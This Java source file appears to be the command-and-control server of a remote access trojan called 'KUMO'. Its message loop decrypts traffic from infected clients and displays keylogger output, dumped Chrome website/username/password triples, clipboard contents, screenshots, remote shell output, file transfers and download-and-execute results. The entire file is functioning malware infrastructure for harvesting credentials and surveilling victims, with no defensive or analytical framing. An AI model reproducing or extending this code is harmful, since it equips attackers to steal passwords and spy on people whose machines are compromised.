package Server;

import GUI.Components.FileContextMenu;
import GUI.Controller;
import GUI.Views.*;
import Logger.Level;
import Logger.Logger;
import Server.Data.CryptoUtils;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import javafx.application.Platform;
import javafx.scene.Scene;
import javafx.stage.Stage;
import javafx.stage.StageStyle;

import java.io.*;

class ProcessCommands implements Repository {

    /* Listens & executes commands received from clients */
    static void processCommands(InputStream is, ClientObject client) throws IOException {
        DataInputStream dis = new DataInputStream(is);
        final Stage[] fileExplorer = {null};
        while (true) {
            String input;
            try {
                input = readFromDis(dis);
            } catch (EOFException e) {
                Logger.log(Level.ERROR, e.toString(), e);
                break;
            }
            /* Reads back the output from a remote execution */
            if (input.contains("CMD")) {
                int outputCount = Integer.parseInt(readFromDis(dis));
                Logger.log(Level.INFO, "CMD length: " + outputCount);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < outputCount; i++) {
                    sb.append(readFromDis(dis)).append("\n");
                }
                SendCommandView.getConsole().appendText(sb.toString());
                /* Sends back the System OS to KUMO */
            } else if (input.contains("SYS")) {
                // OS::uname
                String[] split = readFromDis(dis).split("::");
                String SYSTEMOS = split[0];
                String uname = split[1];
                client.setSYSTEM_OS(SYSTEMOS);
                client.setUname(uname);
                /* Goes up a directory in the file explorer (returns files) */
            } else if (input.contains("DIRECTORYUP")) {
                client.clientCommunicate("FILELIST");
                /* Changes directory to selected one in file explorer (returns files) */
            } else if (input.contains("CHNGDIR")) {
                client.clientCommunicate("FILELIST");
                /* Gets list of files in current directory in file explorer */
            } else if (input.contains("SLEEP")){
                client.setOnlineStatus("Online");
                Controller.updateStats();
                Controller.updateTable();
            } else if (input.equals("READKEYLOG")){
                int len = dis.readInt();
                String content = readFromDis(dis);
                KeyloggerView.getData().setText(content);
            } else if (input.contains("PSHURL")){
                //StringBuilder fullContent = new StringBuilder();
                try{Thread.sleep(100);}catch(InterruptedException e){e.printStackTrace();}
                ChromePassView.getResultsArea().appendText("WEBSITE, USERNAME, PASSWORD\n\n");
                while (true) {
                    String content = readFromDis(dis);
                    if (content == null || content.equals(null)) {
                        continue;
                    }
                    if (content.trim().equals("ENDPSH")) {
                        break;
                    }
                    try{
                        Thread.sleep(50); // DO NOT REMOVE
                    } catch (InterruptedException e){
                        e.printStackTrace();
                    }
                    //System.out.println(content);
                    String[] split = content.split(",");
                    if (split.length != 3){
                        continue;
                    }
                    String password = split[0].replace("\"", "");
                    String website = split[1].replace("\"", "");
                    String username = split[2].replace("\"", "");
                    if (password.equals("")) password = "(none)";
                    if (username.equals("")) username = "(none)";
                    if (website.equals("URL")) continue;

                    ChromePassView.getResultsArea().appendText(website + " :: " + username + " :: " + password + "\n");
                }

            } else if (input.contains("SCREENSHOT")) {
                // SERVER: SCREENSHOT
                // CLIENT: filename
                // CLIENT: b64.encode(file).length
                // CLIENT: base64.encode(file).bytes[n]
                String fname = readFromDis(dis);
                String saveDirectory = FileContextMenu.selectedDirectory;
                long fileLength = dis.readLong();
                File downloadedFile = new File(saveDirectory + fname);
                Logger.log(Level.INFO, "Saving screenshot to " + saveDirectory + fname);
                FileOutputStream fos = new FileOutputStream(downloadedFile);
                BufferedOutputStream bos = new BufferedOutputStream(fos);
                for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
                bos.close();
                fos.close();
            } else if (input.contains("FILELIST")) {
                String pathName = readFromDis(dis);
                int filesCount = dis.readInt();
                String[] fileNames = new String[filesCount];
                for (int i = 0; i < filesCount; i++) {
                    fileNames[i] = readFromDis(dis);
                }
                Platform.runLater(() -> {
                    if (fileExplorer[0] == null) {
                        fileExplorer[0] = new Stage();
                        fileExplorer[0].setMinWidth(400);
                        fileExplorer[0].setMinHeight(400);
                        fileExplorer[0].initStyle(StageStyle.UNDECORATED);
                        fileExplorer[0].setScene(new Scene(new FileExplorerView().getFileExplorerView(pathName, fileNames, fileExplorer[0], client), 900, 500));
                        fileExplorer[0].show();
                    }
                    fileExplorer[0].setScene(new Scene(new FileExplorerView().getFileExplorerView(pathName, fileNames, fileExplorer[0], client), 900, 500));
                });
                /* Receives data from download request in file explorer */
            } else if (input.contains("DOWNLOAD")) {
                String saveDirectory = FileContextMenu.selectedDirectory;
                long fileLength = dis.readLong();
                String fileName = readFromDis(dis);
                File downloadedFile = new File(saveDirectory + "/" + fileName);
                FileOutputStream fos = new FileOutputStream(downloadedFile);
                BufferedOutputStream bos = new BufferedOutputStream(fos);
                for (int j = 0; j < fileLength; j++) bos.write(dis.readInt());
                bos.close();
                fos.close();
            }
            /* Uninstall and close remote server - remove from Kumo */
            else if (input.contains("EXIT")) {
                PseudoBase.getKumoData().remove(client.getIP());
                CONNECTIONS.remove(client.getIP());
                Controller.updateStats();
                Controller.updateTable();
                client.getClient().close();
                break;
            } else if (input.contains("SYINFO")){
                String data = readFromDis(dis);
                Logger.log(Level.INFO, "SYSINFO: \n" + data);
                SysInfoView.getArea().appendText(data);
            } else if (input.contains("BEACON")) {
                client.setOnlineStatus("Online");
            } else if (input.contains("DAE")){
                int status = Integer.parseInt(readFromDis(dis));
                System.out.println("DOWNLOAD AND EXECUTE STATUS: " + status);
                if (status == 0){
                    DownloadAndExecuteView.setStatusLabelColor("red");
                    DownloadAndExecuteView.setStatusLabel("Failed to execute");
                } else {
                    DownloadAndExecuteView.setStatusLabelColor("green");
                    DownloadAndExecuteView.setStatusLabel("Execution successful");
                }

            } else if (input.contains("PLUGOUT")){
                String output = readFromDis(dis);
                PluginView.getData().setText(output);
            }

            /** clipboard stuff **/
            else if (input.contains("CLIPGET")){
                GetClipboardView.getData().appendText("Clipboard data: \n\n" + readFromDis(dis));
            }
        }
    }

    private static String readFromDis(DataInputStream dis) throws IOException {
        return CryptoUtils.decrypt(dis.readUTF(), KumoSettings.AES_KEY);
    }

    private static Long readLongFromDisNoEnc(DataInputStream dis) throws IOException{
        return dis.readLong();
    }
}
